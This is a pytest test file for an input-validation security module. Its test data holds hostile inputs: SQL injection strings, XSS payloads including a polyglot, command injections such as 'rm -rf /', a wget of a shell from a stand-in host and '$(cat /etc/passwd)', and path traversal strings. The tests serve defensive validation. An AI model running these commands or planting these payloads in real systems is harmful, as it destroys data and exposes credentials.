"""
Unit tests for Input Validation Module (OWASP compliant)

Tests SQL injection, XSS, command injection, path traversal protection.
Per CLAUDE.md: Comprehensive security testing.

Author: DevSkyy Team
Version: 1.0.0
"""

from fastapi import HTTPException
import pytest

from security.input_validation import (
    AlphanumericValidator,
    ContentSecurityPolicy,
    EmailValidator,
    InputSanitizer,
    URLValidator,
)


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention."""

    def test_detect_union_select(self):
        """Test detection of UNION SELECT attacks."""
        malicious_input = "admin' UNION SELECT * FROM users--"

        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_sql(malicious_input)

        assert exc_info.value.status_code == 400
        assert "SQL injection" in exc_info.value.detail

    def test_detect_or_equals(self):
        """Test detection of OR 1=1 attacks."""
        malicious_input = "' OR 1=1--"

        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_sql(malicious_input)

        assert exc_info.value.status_code == 400

    def test_detect_drop_table(self):
        """Test detection of DROP TABLE attacks."""
        malicious_input = "'; DROP TABLE users; --"

        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_sql(malicious_input)

        assert exc_info.value.status_code == 400

    def test_safe_sql_input(self):
        """Test that safe input passes validation."""
        safe_input = "John Doe"
        result = InputSanitizer.sanitize_sql(safe_input)

        assert result is not None
        # Single quotes should be escaped for SQL safety
        assert "''" in InputSanitizer.sanitize_sql("O'Brien")


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention."""

    def test_detect_script_tag(self):
        """Test detection of <script> tags."""
        malicious_input = "<script>alert('XSS')</script>"
        result = InputSanitizer.sanitize_html(malicious_input)

        # Script tag should be removed or escaped
        assert "<script>" not in result.lower() or "&lt;script&gt;" in result

    def test_detect_javascript_protocol(self):
        """Test detection of javascript: protocol."""
        malicious_input = "<a href='javascript:alert(1)'>Click</a>"
        result = InputSanitizer.sanitize_html(malicious_input)

        # Should be sanitized
        assert "javascript:" not in result.lower() or result != malicious_input

    def test_detect_event_handlers(self):
        """Test detection of event handler attributes."""
        malicious_inputs = [
            "<img src=x onerror=alert(1)>",
            "<div onload=alert('XSS')>",
            "<button onclick='malicious()'>Click</button>",
        ]

        for malicious_input in malicious_inputs:
            result = InputSanitizer.sanitize_html(malicious_input)
            # Event handlers should be removed or escaped
            assert result != malicious_input or "onerror" not in result.lower()

    def test_safe_html_input(self):
        """Test that safe input is properly escaped."""
        safe_input = "Hello <World>"
        result = InputSanitizer.sanitize_html(safe_input)

        # HTML entities should be escaped
        assert "&lt;" in result or result == safe_input


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    def test_detect_pipe_commands(self):
        """Test detection of pipe-based command injection."""
        malicious_inputs = [
            "file.txt | cat /etc/passwd",
            "data; rm -rf /",
            "input && wget malicious.com/shell",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(HTTPException) as exc_info:
                InputSanitizer.sanitize_command(malicious_input)

            assert exc_info.value.status_code == 400
            assert "command injection" in exc_info.value.detail.lower()

    def test_detect_command_substitution(self):
        """Test detection of command substitution."""
        malicious_inputs = [
            "$(cat /etc/passwd)",
            "`whoami`",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(HTTPException):
                InputSanitizer.sanitize_command(malicious_input)

    def test_safe_command_input(self):
        """
        Verifies that a benign filename is unchanged by the command sanitizer.

        Uses a simple safe filename ("myfile.txt") and asserts sanitize_command returns the same string.
        """
        safe_input = "myfile.txt"
        result = InputSanitizer.sanitize_command(safe_input)

        assert result == safe_input


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    def test_detect_dot_dot_slash(self):
        """Test detection of ../ path traversal."""
        malicious_inputs = [
            "../../../etc/passwd",
            "files/../../../secret.txt",
            "..\\..\\windows\\system32",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(HTTPException) as exc_info:
                InputSanitizer.sanitize_path(malicious_input)

            assert exc_info.value.status_code == 400
            assert "path traversal" in exc_info.value.detail.lower()

    def test_detect_encoded_traversal(self):
        """Test detection of URL-encoded traversal."""
        malicious_input = "%2e%2e%2f%2e%2e%2fetc%2fpasswd"

        with pytest.raises(HTTPException):
            InputSanitizer.sanitize_path(malicious_input)

    def test_safe_path_input(self):
        """Test that safe paths pass validation."""
        safe_paths = [
            "uploads/file.jpg",
            "documents/report.pdf",
            "images/logo.png",
        ]

        for safe_path in safe_paths:
            result = InputSanitizer.sanitize_path(safe_path)
            assert result is not None


class TestValidationModels:
    """Test Pydantic validation models."""

    def test_email_validator_valid(self):
        """Test valid email addresses."""
        valid_emails = [
            "user@example.com",
            "john.doe@company.co.uk",
            "admin+tag@domain.io",
        ]

        for email in valid_emails:
            validator = EmailValidator(email=email)
            assert validator.email == email

    def test_email_validator_invalid(self):
        """Test invalid email addresses."""
        invalid_emails = [
            "not-an-email",
            "@domain.com",
            "user@",
            "user space@domain.com",
        ]

        for email in invalid_emails:
            with pytest.raises(Exception):  # Pydantic ValidationError
                EmailValidator(email=email)

    def test_url_validator_valid(self):
        """Test valid URLs."""
        valid_urls = [
            "https://example.com",
            "http://subdomain.example.co.uk/path",
            "https://api.service.io/v1/endpoint",
        ]

        for url in valid_urls:
            validator = URLValidator(url=url)
            assert validator.url == url

    def test_url_validator_invalid(self):
        """Test invalid URLs."""
        invalid_urls = [
            "not-a-url",
            "ftp://example.com",  # Only http/https allowed
            "javascript:alert(1)",
        ]

        for url in invalid_urls:
            with pytest.raises(Exception):
                URLValidator(url=url)

    def test_alphanumeric_validator_valid(self):
        """Test valid alphanumeric values."""
        valid_values = [
            "username123",
            "user_name",
            "api-key-123",
        ]

        for value in valid_values:
            validator = AlphanumericValidator(value=value)
            assert validator.value == value

    def test_alphanumeric_validator_invalid(self):
        """Test invalid alphanumeric values."""
        invalid_values = [
            "user name",  # Space
            "user@name",  # Special char
            "user;DROP TABLE",  # SQL injection attempt
        ]

        for value in invalid_values:
            with pytest.raises(Exception):
                AlphanumericValidator(value=value)


class TestContentSecurityPolicy:
    """Test Content Security Policy headers."""

    def test_csp_headers_present(self):
        """Test that all required CSP headers are present."""
        headers = ContentSecurityPolicy.get_csp_header()

        required_headers = [
            "Content-Security-Policy",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
        ]

        for header in required_headers:
            assert header in headers

    def test_csp_header_values(self):
        """Test CSP header values are secure."""
        headers = ContentSecurityPolicy.get_csp_header()

        # Check critical values
        assert "default-src 'self'" in headers["Content-Security-Policy"]
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert "max-age" in headers["Strict-Transport-Security"]


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_string_input(self):
        """Test handling of empty strings."""
        empty = ""

        # Should not raise errors
        sql_result = InputSanitizer.sanitize_sql(empty)
        html_result = InputSanitizer.sanitize_html(empty)
        cmd_result = InputSanitizer.sanitize_command(empty)
        path_result = InputSanitizer.sanitize_path(empty)

        assert sql_result == empty
        assert html_result == empty
        assert cmd_result == empty
        assert path_result == empty

    def test_non_string_input(self):
        """Test handling of non-string input."""
        non_strings = [123, None, [], {}]

        for value in non_strings:
            # Should return value unchanged
            assert InputSanitizer.sanitize_sql(value) == value
            assert InputSanitizer.sanitize_html(value) == value
            assert InputSanitizer.sanitize_command(value) == value
            assert InputSanitizer.sanitize_path(value) == value

    def test_very_long_input(self):
        """Test handling of very long input strings."""
        long_input = "a" * 10000

        # Should not raise errors
        result = InputSanitizer.sanitize_html(long_input)
        assert len(result) >= len(long_input)

    def test_unicode_input(self):
        """Test handling of Unicode characters."""
        unicode_inputs = [
            "Hello 世界",
            "Привет мир",
            "مرحبا العالم",
            "🚀🎨✨",
        ]

        for unicode_input in unicode_inputs:
            # Should handle Unicode gracefully
            result = InputSanitizer.sanitize_html(unicode_input)
            assert result is not None


class TestRealWorldScenarios:
    """Test real-world attack scenarios."""

    def test_combined_sql_xss_attack(self):
        """Test combined SQL injection + XSS attack."""
        malicious_input = "'; DROP TABLE users; --<script>alert('XSS')</script>"

        # Should detect SQL injection
        with pytest.raises(HTTPException):
            InputSanitizer.sanitize_sql(malicious_input)

        # Should sanitize XSS
        html_result = InputSanitizer.sanitize_html(malicious_input)
        assert "<script>" not in html_result or "&lt;" in html_result

    def test_polyglot_attack(self):
        """Test polyglot attack (valid in multiple contexts)."""
        # Famous polyglot by Gareth Heyes
        polyglot = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"

        # Should be caught by XSS detection
        html_result = InputSanitizer.sanitize_html(polyglot)
        assert html_result != polyglot  # Should be modified

    def test_null_byte_injection(self):
        """Test null byte injection attacks."""
        malicious_input = "file.txt\\x00.php"

        # Should handle null bytes safely
        InputSanitizer.sanitize_path(malicious_input)
        # Null bytes should be removed or escaped


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=security.input_validation", "--cov-report=term-missing"])
